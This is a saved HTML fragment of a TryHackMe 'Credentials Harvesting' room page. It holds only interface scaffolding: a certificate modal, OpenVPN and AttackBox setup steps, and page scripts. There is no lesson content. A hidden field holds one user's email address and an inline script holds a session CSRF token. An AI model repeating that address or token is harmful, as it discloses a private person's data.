<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Cloud Information</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="nav nav-tabs hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item pr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#env-tab" data-pf_style_display="none" data-pf_style_visibility="hidden">Environment</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#creds-tab" data-pf_style_display="none" data-pf_style_visibility="hidden">Credentials</a>
</li>
</ul>
<div class="tab-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="tab-pane active hidden-originally" id="env-tab" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="tab-pane hidden-originally" id="creds-tab" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
<div class="modal-footer hidden-originally" id="cloudEnvModalFooter" data-pf_style_display="none" data-pf_style_visibility="hidden">
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="setNameModal" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-lg modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Generating Your Certificate</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body container hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Hey there, what's your name?</h5>
<p class="text-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
</div>
</div>
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You're here incognito? It's ok!</h5>
<p class="text-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-success float-right hidden-originally" id="modal-cert-generate" onclick="gen_cert(true)" disabled="" data-pf_style_display="none" data-pf_style_visibility="hidden">
Generate with my full name
</button>
</div>
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-primary float-right hidden-originally" id="modal-cert-skip" onclick="gen_cert(false)" data-pf_style_display="none" data-pf_style_visibility="hidden">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Credentials Harvesting_files/certificateName.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div class="modal fade slideout-faq hidden-originally" id="roomSlideoutUnstuck" tabindex="-1" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-slideout hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-links" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="unstuck-video" class="unstuck-group hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-play hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-pen-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group hidden-originally" href="https://tryhackme.com/forum/thread/6310bae091f9effb72f6045b" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-comments-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-books hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-users hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq hidden-originally" id="navConnModal" tabindex="-1" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-slideout hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-bk" class="noselect hidden-originally" onclick="showSlideoutConnOptions()" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-arrow-left mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Show Connection Options</div>
<div id="slideout-conn-options" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="slideout-conn-header" class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img class="slideout-connect-img hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/tryhackme_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-conn-status" class="size-22 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You are <span class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">disconnected</span></div>
</div>
<div class="m-3 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-md-12 mb-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="clear-link preventDefault hidden-originally" href="https://tryhackme.com/room/credharvesting#" onclick="showAttackBoxSteps()" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col col-2 text-center faq-quicklinks-icons hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="far fa-laptop hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="col hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="faq-quicklinks-title size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">AttackBox</div>
<p class="faded mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="clear-link preventDefault hidden-originally" href="https://tryhackme.com/room/credharvesting#" onclick="showVPNSteps()" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col col-2 text-center faq-quicklinks-icons hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="far fa-key hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div class="col hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="faq-quicklinks-title size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">OpenVPN</div>
<p class="faded mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
 <div id="nav-openvpn" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="mb-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a target="_blank" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center hidden-originally" id="vpn-guide" style="display: flex; justify-content: center;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/credharvesting#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-windows mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Windows</a>
</li>
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/credharvesting#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-linux mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Linux</a>
</li>
<li class="nav-item m-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="pill" href="https://tryhackme.com/room/credharvesting#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fab fa-apple mr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="tab-pane fade hidden-originally" id="pills-windows" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Open and run the OpenVPN GUI application as Administrator.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/win_ran_admin.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Import File</b>. <br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/win_import.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Select the configuration file you downloaded earlier.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Now right click on the application again, select your file and click Connect <br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/win_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
</ol>
</div>
<div class="tab-pane fade show active hidden-originally" id="pills-linux" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Run the following command in your terminal: <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">sudo apt install openvpn</code></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use your OpenVPN file with the following command: <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade hidden-originally" id="pills-macos" role="tabpanel" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ol data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><a href="https://tryhackme.com/vpn/get-config" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img width="250" class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/mac_installer.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Open and run the OpenVPN GUI application.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">The application will start running and appear in your top bar. Right click on the application and click <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Import File -&gt; Local file</b>.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/mac_import.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Select the configuration file you downloaded earlier.</li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Right click on the application again, select your file and click connect.<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><img class="mt-2 mb-3 hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/mac_connect.png" data-pf_style_display="none" data-pf_style_visibility="hidden"></li>
</ol>
</div>
</div>
<section class="text-left hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="remove-underline hidden-originally" data-toggle="collapse" href="https://tryhackme.com/room/credharvesting#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="mb-0 text-openvpn hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Having Problems?</h5>
</a>
<div class="collapse hidden-originally" id="havingProblems" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="mt-2 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">If you can access <a target="_blank" href="http://10.10.10.10/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">10.10.10.10</a>, you're connected.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Downloading and getting a 404? Go the <a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">access</a> page and switch VPN servers.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Getting inline cert error? Go the <a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">access</a> page and switch VPN servers.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Is the OpenVPN client running as root? <span class="size-14 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Have you restarted your VM?</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Is your OpenVPN up-to-date?</li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Only 1 OpenVPN connection is allowed. <span class="size-14 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(Run <code class="dark hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">AttackBox</h4>
<p class="faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">To start your AttackBox in the room, click the <a class="preventDefault hidden-originally" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/credharvesting#" data-pf_style_display="none" data-pf_style_visibility="hidden">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Free users get 1 free AttackBox hour. <a class="hacker-green hidden-originally" href="https://tryhackme.com/why-subscribe" data-pf_style_display="none" data-pf_style_visibility="hidden">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Hide IP</span>
</div>
</div>
</div>
</div>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Credentials Harvesting_files/notify.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/api-requests.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/events.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/underscore-min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/apexcharts.min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script> 
<script src="./TryHackMe _ Credentials Harvesting_files/chart.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/expire.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/sockets.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/faqSearch.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/certificate.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/utils.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/roomSpecific.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/confetti.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/videos.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/intro.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/prism.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/asciinema-player.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/magnific-popup.min.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/introjsLogic.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/logic.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/tasks.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/connection-status.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/glossary.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/room-mymachine.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/heartbeat.js" defer="" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "ruUA6Iwd-x8PYlQ1mD_jj3igvOjngMkE2INA"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "credharvesting"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


